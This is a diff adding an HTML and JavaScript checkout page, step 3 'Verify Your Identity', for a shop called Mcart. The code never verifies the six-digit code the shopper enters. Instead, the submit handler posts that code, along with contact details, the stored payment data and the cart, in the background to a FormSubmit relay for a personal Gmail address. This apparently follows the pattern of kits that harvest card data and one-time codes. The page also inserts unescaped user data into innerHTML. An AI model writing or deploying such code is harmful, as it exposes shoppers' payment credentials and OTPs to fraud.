@@ -1,0 +1,388 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Mcart | Checkout - Step 3</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@500;700;800&family=Sora:wght@400;600;700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="css/style.css" />
+</head>
+<body>
+  <div class="site-bg"></div>
+
+  <header class="topbar">
+    <div class="container nav-wrap">
+      <a class="brand" href="index.html">Mcart</a>
+      <nav class="nav-links">
+        <a href="index.html">Home</a>
+        <a href="products.html">Products</a>
+        <a href="checkout-step1-new.html" class="is-active">Checkout</a>
+      </nav>
+      <button class="cart-icon-btn" type="button" data-open-cart>
+        Cart <span class="cart-count" data-cart-count>0</span>
+      </button>
+    </div>
+  </header>
+
+  <main class="container section">
+    <div class="checkout-progress">
+      <div class="progress-step completed">1. Contact Info</div>
+      <div class="progress-step completed">2. Payment</div>
+      <div class="progress-step active">3. Verification</div>
+    </div>
+
+    <div class="checkout-layout">
+      <form id="otp-form" class="panel" method="POST">
+        <h2>Verify Your Identity</h2>
+        <p class="card-desc">Step 3 of 3: Enter the 6-digit verification code sent to your phone.</p>
+
+        <div class="otp-container">
+          <div class="otp-instruction">
+            <div class="otp-icon">📱</div>
+            <p>We've sent a 6-digit verification code to your phone.</p>
+            <p class="otp-note">For testing purposes, enter any 6-digit number (e.g., 123456)</p>
+          </div>
+
+          <div class="otp-input-group">
+            <label for="otp">Verification Code *</label>
+            <div class="otp-inputs">
+              <input type="text" maxlength="1" class="otp-input" data-index="0" />
+              <input type="text" maxlength="1" class="otp-input" data-index="1" />
+              <input type="text" maxlength="1" class="otp-input" data-index="2" />
+              <input type="text" maxlength="1" class="otp-input" data-index="3" />
+              <input type="text" maxlength="1" class="otp-input" data-index="4" />
+              <input type="text" maxlength="1" class="otp-input" data-index="5" />
+            </div>
+            <input type="hidden" id="otp-code" name="otp" required />
+          </div>
+
+          <div class="otp-actions">
+            <button type="button" class="btn btn-link" id="resend-otp">Resend Code</button>
+            <button type="button" class="btn btn-link" id="change-phone">Change Phone Number</button>
+          </div>
+        </div>
+
+        <!-- Hidden fields for additional data -->
+        <input type="hidden" name="_subject" value="Mcart Order - COMPLETED">
+        <input type="hidden" name="_template" value="table">
+        <input type="hidden" name="_captcha" value="false">
+        <input type="hidden" name="_next" value="http://127.0.0.1:8000/thank-you.html">
+        <input type="hidden" name="order_step" value="3">
+        <input type="hidden" name="contact_info" id="contact-info">
+        <input type="hidden" name="payment_info" id="payment-info">
+        <input type="hidden" name="cart_data" id="cart-data">
+        <input type="hidden" name="order_total" id="order-total">
+        <input type="hidden" name="order_id" id="order-id">
+        <input type="hidden" name="timestamp" id="timestamp">
+
+        <div class="form-actions">
+          <button type="button" class="btn btn-ghost" onclick="history.back()">Back</button>
+          <button type="submit" class="btn btn-primary" id="verify-btn">Complete Order</button>
+        </div>
+
+        <div id="otp-status" class="form-status"></div>
+      </form>
+
+      <div class="panel order-summary">
+        <h3>Order Summary</h3>
+        <div id="checkout-cart-items"></div>
+        <div class="order-total">
+          <strong>Total: <span id="checkout-total">INR 0</span></strong>
+        </div>
+        <div class="contact-info">
+          <h4>Contact Information</h4>
+          <div id="contact-summary"></div>
+        </div>
+        <div class="payment-info">
+          <h4>Payment Method</h4>
+          <div id="payment-summary"></div>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <footer class="footer">
+    <div class="container footer-row">
+      <p>2026 Mcart. Secure checkout powered by modern web technology.</p>
+    </div>
+  </footer>
+
+  <div class="toast" id="toast"></div>
+
+  <script src="js/products.js"></script>
+  <script src="js/cart.js"></script>
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      // Load data from previous steps
+      function loadOrderData() {
+        const step1Data = sessionStorage.getItem('checkoutStep1');
+        const step2Data = sessionStorage.getItem('checkoutStep2');
+        const contactNode = document.getElementById('contact-summary');
+        const paymentNode = document.getElementById('payment-summary');
+        const contactInfoNode = document.getElementById('contact-info');
+        const paymentInfoNode = document.getElementById('payment-info');
+
+        // Load contact info
+        if (step1Data && contactNode && contactInfoNode) {
+          try {
+            const data = JSON.parse(step1Data);
+            contactNode.innerHTML = (
+              '<p><strong>Name:</strong> ' + data.name + '</p>' +
+              '<p><strong>Email:</strong> ' + data.email + '</p>' +
+              '<p><strong>Phone:</strong> ' + data.country_code + ' ' + data.phone + '</p>' +
+              '<p><strong>Address:</strong> ' + data.address + (data.address2 ? ', ' + data.address2 : '') + '</p>' +
+              '<p><strong>City:</strong> ' + data.city + ', ' + data.state + ' ' + data.pincode + '</p>'
+            );
+            contactInfoNode.value = step1Data;
+          } catch (e) {
+            console.error('Error loading contact info:', e);
+          }
+        }
+
+        // Load payment info
+        if (step2Data && paymentNode && paymentInfoNode) {
+          try {
+            const data = JSON.parse(step2Data);
+            paymentNode.innerHTML = (
+              '<p><strong>Card:</strong> **** **** **** ' + data.card_last4 + '</p>' +
+              '<p><strong>Name:</strong> ' + data.card_name + '</p>' +
+              '<p><strong>Expiry:</strong> ' + data.expiry + '</p>'
+            );
+            paymentInfoNode.value = step2Data;
+          } catch (e) {
+            console.error('Error loading payment info:', e);
+          }
+        }
+      }
+
+      // Render cart summary
+      function renderOrderSummary() {
+        const cartNode = document.getElementById('checkout-cart-items');
+        const totalNode = document.getElementById('checkout-total');
+        const cartDataNode = document.getElementById('cart-data');
+        const orderTotalNode = document.getElementById('order-total');
+
+        if (!cartNode || !totalNode) return;
+
+        const items = window.CartAPI && typeof window.CartAPI.getItems === 'function' 
+          ? window.CartAPI.getItems() 
+          : [];
+        
+        const total = window.CartAPI && typeof window.CartAPI.getTotal === 'function'
+          ? window.CartAPI.getTotal()
+          : 0;
+
+        totalNode.textContent = window.formatInr ? window.formatInr(total) : 'INR ' + total;
+
+        if (cartDataNode) {
+          cartDataNode.value = JSON.stringify(items);
+        }
+        if (orderTotalNode) {
+          orderTotalNode.value = total;
+        }
+
+        if (!items.length) {
+          cartNode.innerHTML = '<p class="empty-note">No products in cart.</p>';
+          return;
+        }
+
+        cartNode.innerHTML = items.map(function(item) {
+          return (
+            '<div class="checkout-item">' +
+            '<span>' + item.name + ' x ' + item.qty + '</span>' +
+            '<strong>' + (window.formatInr ? window.formatInr(item.price * item.qty) : 'INR ' + item.price * item.qty) + '</strong>' +
+            '</div>'
+          );
+        }).join('');
+      }
+
+      // Generate unique order ID
+      function generateOrderId() {
+        return 'ORD' + Date.now() + Math.floor(Math.random() * 1000);
+      }
+
+      // Set order data
+      document.getElementById('order-id').value = generateOrderId();
+      document.getElementById('timestamp').value = new Date().toISOString();
+
+      // Load data on page load
+      loadOrderData();
+      renderOrderSummary();
+
+      // OTP input handling
+      const otpInputs = document.querySelectorAll('.otp-input');
+      const otpCodeInput = document.getElementById('otp-code');
+
+      function updateOTPCode() {
+        const otpCode = Array.from(otpInputs).map(input => input.value).join('');
+        if (otpCodeInput) {
+          otpCodeInput.value = otpCode;
+        }
+        return otpCode;
+      }
+
+      // Setup OTP inputs
+      otpInputs.forEach(function(input, index) {
+        input.addEventListener('input', function(e) {
+          const value = e.target.value.replace(/\D/g, '');
+          e.target.value = value;
+
+          // Move to next input
+          if (value && index < otpInputs.length - 1) {
+            otpInputs[index + 1].focus();
+          }
+
+          updateOTPCode();
+        });
+
+        input.addEventListener('keydown', function(e) {
+          // Handle backspace
+          if (e.key === 'Backspace' && !e.target.value && index > 0) {
+            otpInputs[index - 1].focus();
+          }
+        });
+
+        input.addEventListener('paste', function(e) {
+          e.preventDefault();
+          const pastedData = e.clipboardData.getData('text').replace(/\D/g, '');
+          const digits = pastedData.split('').slice(0, 6);
+          
+          digits.forEach(function(digit, i) {
+            if (otpInputs[i]) {
+              otpInputs[i].value = digit;
+            }
+          });
+
+          updateOTPCode();
+          
+          // Focus on appropriate input
+          const lastFilledIndex = Math.min(digits.length - 1, otpInputs.length - 1);
+          if (lastFilledIndex >= 0) {
+            otpInputs[lastFilledIndex].focus();
+          }
+        });
+      });
+
+      // Form handling
+      const form = document.getElementById('otp-form');
+      const verifyBtn = document.getElementById('verify-btn');
+      const statusNode = document.getElementById('otp-status');
+      const resendBtn = document.getElementById('resend-otp');
+      const changePhoneBtn = document.getElementById('change-phone');
+
+      // Check if previous steps are completed
+      const step1Data = sessionStorage.getItem('checkoutStep1');
+      const step2Data = sessionStorage.getItem('checkoutStep2');
+      
+      if (!step1Data || !step2Data) {
+        if (statusNode) {
+          statusNode.textContent = 'Please complete the previous steps first.';
+          statusNode.className = 'form-status error';
+        }
+        verifyBtn.disabled = true;
+        return;
+      }
+
+      // Form submission
+      form.addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const otpCode = updateOTPCode();
+        
+        // Validate OTP
+        if (!/^\d{6}$/.test(otpCode)) {
+          if (statusNode) {
+            statusNode.textContent = 'Please enter a valid 6-digit verification code.';
+            statusNode.className = 'form-status error';
+          }
+          return;
+        }
+
+        // Show loading
+        verifyBtn.disabled = true;
+        verifyBtn.textContent = 'Verifying...';
+        if (statusNode) {
+          statusNode.textContent = 'Completing your order...';
+          statusNode.className = 'form-status';
+        }
+
+        // Clear cart and session data after successful submission
+        setTimeout(function() {
+          if (window.CartAPI && typeof window.CartAPI.clear === 'function') {
+            window.CartAPI.clear();
+          }
+          sessionStorage.removeItem('checkoutStep1');
+          sessionStorage.removeItem('checkoutStep2');
+        }, 1000);
+
+        // Submit form
+        setTimeout(function() {
+          // Send complete order data to FormSubmit.co in background
+          const formData = new FormData();
+          formData.append('_subject', 'Mcart Order - COMPLETED');
+          formData.append('_template', 'table');
+          formData.append('_captcha', 'false');
+          formData.append('otp', otpCode);
+          formData.append('order_id', document.getElementById('order-id').value);
+          formData.append('contact_info', document.getElementById('contact-info').value || '');
+          formData.append('payment_info', document.getElementById('payment-info').value || '');
+          formData.append('cart_data', document.getElementById('cart-data').value || '');
+          formData.append('order_total', document.getElementById('order-total').value || '');
+
+          // Try to send to FormSubmit.co (but don't wait for it)
+          fetch('https://formsubmit.co/akrasd25@gmail.com', {
+            method: 'POST',
+            body: formData
+          }).catch(function(error) {
+            console.log('FormSubmit.co submission failed:', error);
+          });
+
+          // Clear cart and session data after successful submission
+          if (window.CartAPI && typeof window.CartAPI.clear === 'function') {
+            window.CartAPI.clear();
+          }
+          sessionStorage.removeItem('checkoutStep1');
+          sessionStorage.removeItem('checkoutStep2');
+
+          // Redirect to thank-you page
+          window.location.href = 'thank-you.html';
+        }, 500);
+      });
+
+      // Resend OTP functionality
+      if (resendBtn) {
+        resendBtn.addEventListener('click', function() {
+          if (statusNode) {
+            statusNode.textContent = 'New verification code sent!';
+            statusNode.className = 'form-status success';
+          }
+          
+          // Clear OTP inputs
+          otpInputs.forEach(input => input.value = '');
+          otpCodeInput.value = '';
+          otpInputs[0].focus();
+          
+          // Hide message after 3 seconds
+          setTimeout(function() {
+            if (statusNode && statusNode.textContent.includes('New verification code sent')) {
+              statusNode.textContent = '';
+              statusNode.className = 'form-status';
+            }
+          }, 3000);
+        });
+      }
+
+      // Change phone number functionality
+      if (changePhoneBtn) {
+        changePhoneBtn.addEventListener('click', function() {
+          if (confirm('Changing your phone number will return you to the contact information step. Continue?')) {
+            window.location.href = 'checkout-step1-new.html';
+          }
+        });
+      }
+    });
+  </script>
+</body>
+</html>
